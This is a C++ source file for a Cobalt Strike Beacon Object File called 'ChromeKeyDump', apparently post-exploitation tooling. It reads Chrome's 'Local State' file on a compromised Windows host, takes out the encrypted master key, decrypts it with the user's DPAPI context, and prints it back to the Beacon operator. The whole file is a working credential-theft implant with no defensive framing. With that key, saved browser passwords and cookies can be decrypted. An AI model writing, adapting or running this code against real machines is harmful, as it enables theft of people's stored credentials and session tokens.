#define _WIN32_WINNT 0x06000000 // For Mingw

#include <windows.h>
#include <shlobj.h>

extern "C" {
    #include "beacon.h"
}

#define BOF_REDECLARE(mod, func) extern "C" __declspec(dllimport) decltype(func) mod ## $ ## func 
#define BOF_LOCAL(mod, func) decltype(func) * func = mod ## $ ## func

BOF_REDECLARE(KERNEL32, ReadFile);
BOF_REDECLARE(KERNEL32, CreateFileW);
BOF_REDECLARE(KERNEL32, CloseHandle);
BOF_REDECLARE(KERNEL32, LocalFree);
BOF_REDECLARE(CRYPT32, CryptStringToBinaryA);
BOF_REDECLARE(CRYPT32, CryptBinaryToStringA);
BOF_REDECLARE(CRYPT32, CryptUnprotectData);
BOF_REDECLARE(SHELL32, SHGetKnownFolderPath);
BOF_REDECLARE(MSVCRT, malloc);
BOF_REDECLARE(MSVCRT, free);
BOF_REDECLARE(MSVCRT, strncpy);
BOF_REDECLARE(NTDLL, memcpy);
BOF_REDECLARE(KERNEL32, lstrcatW);
BOF_REDECLARE(KERNEL32, lstrlenW);
BOF_REDECLARE(KERNEL32, GetLastError);

#define BOF_LOCALS \
    BOF_LOCAL(KERNEL32, ReadFile); \
    BOF_LOCAL(KERNEL32, CreateFileW); \
    BOF_LOCAL(KERNEL32, CloseHandle); \
    BOF_LOCAL(KERNEL32, LocalFree); \
    BOF_LOCAL(CRYPT32, CryptStringToBinaryA); \
    BOF_LOCAL(CRYPT32, CryptBinaryToStringA); \
    BOF_LOCAL(CRYPT32, CryptUnprotectData); \
    BOF_LOCAL(SHELL32, SHGetKnownFolderPath); \
    BOF_LOCAL(MSVCRT, malloc); \
    BOF_LOCAL(MSVCRT, free); \
    BOF_LOCAL(MSVCRT, strncpy); \
    BOF_LOCAL(NTDLL, memcpy); \
    BOF_LOCAL(KERNEL32, lstrcatW); \
    BOF_LOCAL(KERNEL32, lstrlenW); \
    BOF_LOCAL(KERNEL32, GetLastError);


extern "C" void go(char* args, int alen) {
    BOF_LOCALS;

    WCHAR szFilePath[MAX_PATH];
    GUID local_FOLDERID_LocalAppData = { 0xF1B32785, 0x6FBA, 0x4FCF, 0x9D, 0x55, 0x7B, 0x8E, 0x7F, 0x15, 0x70, 0x91 };

    PWSTR appdate;
    HRESULT result;
    if ((result = SHGetKnownFolderPath(local_FOLDERID_LocalAppData, 0, 0, &appdate)) != ((HRESULT)0L)) {
        BeaconPrintf(CALLBACK_ERROR, "[ChromeKeyDump] SHGetKnownFolderPath failed hresult=%08x\n", result);
        return;
    }

    memcpy(szFilePath, appdate, lstrlenW(appdate) * 2 + 2);
    lstrcatW(szFilePath, L"\\Google\\Chrome\\User Data\\Local State");

    BeaconPrintf(CALLBACK_OUTPUT, "[ChromeKeyDump] Target File: %S\n", szFilePath);

    HANDLE hFile = CreateFileW(szFilePath, FILE_READ_ACCESS, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[ChromeKeyDump] CreateFileW failed lasterror=%08x\n", GetLastError());
        return;
    }

    DWORD dwReaded;
    char file_read[2048];
    ReadFile(hFile, &file_read, 2048, &dwReaded, 0);
    CloseHandle(hFile);

    char encKey[357];
    int i;

    for (i = 0; i < sizeof(file_read); i++)
    {
        if ((file_read[i-5] == 101) && (file_read[i-4] == 121) && (file_read[i-3] == 34) && (file_read[i-2] == 58) && (file_read[i-1] == 34)) { // ey_":"
            BeaconPrintf(CALLBACK_OUTPUT, "[ChromeKeyDump] EncryptedKey position: %i\n", i);
            strncpy(encKey, &file_read[i], 356);
            break;
        }
    }
    
    if (encKey[0] == '\0') {
        BeaconPrintf(CALLBACK_ERROR, "[ChromeKeyDump] EncryptedKey not found\n");
        return;
    }

    DWORD bufLen = 0;
    CryptStringToBinaryA(encKey, 0, CRYPT_STRING_BASE64, NULL, &bufLen, NULL, NULL);
    BYTE* decBuf1 = (BYTE*)malloc(bufLen);
    CryptStringToBinaryA(encKey, 0, CRYPT_STRING_BASE64, decBuf1, &bufLen, NULL, NULL);
    BYTE* decBuf2 = &decBuf1[5];
    
    DATA_BLOB DataIn;
    DataIn.cbData = bufLen-5;
    DataIn.pbData = (PBYTE)decBuf2;

    DATA_BLOB DataOut;
    DataOut.cbData = 0;
    DataOut.pbData = NULL;

    if(CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
        DWORD deckeyLen = 0;
        CryptBinaryToStringA(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64, NULL, &deckeyLen);
        char* decKey = (char*)malloc(deckeyLen);
        CryptBinaryToStringA(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64, decKey, &deckeyLen);
        BeaconPrintf(CALLBACK_OUTPUT, "[ChromeKeyDump] Masterkey: %s\n", decKey);
        free(decKey);
    }
    else {
        BeaconPrintf(CALLBACK_ERROR, "[ChromeKeyDump] CryptUnprotectData failed\n");
    }
    free(decBuf1);
    LocalFree(DataOut.pbData);
};